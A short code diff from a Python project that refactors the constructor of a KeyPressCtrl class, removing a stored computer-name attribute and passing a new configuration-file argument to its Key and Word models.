@@ -7,7 +7,6 @@ if os.name == 'posix':
 from pprint import pprint
 
 class KeyPressCtrl:
-    __computerName = None
     __keyModel = None
     __wordModel = None
     __lastword = None
@@ -48,10 +47,9 @@ class KeyPressCtrl:
         except:
             pass
 
-    def __init__(self, computerName):
-        self.__computerName = computerName
-        self.__keyModel = Key(self.__computerName)
-        self.__wordModel = Word(self.__computerName)
+    def __init__(self, computerName, cfg_file):
+        self.__keyModel = Key(computerName, cfg_file)
+        self.__wordModel = Word(computerName, cfg_file)
         self.__lastword = ""
 
         if os.name == 'nt':
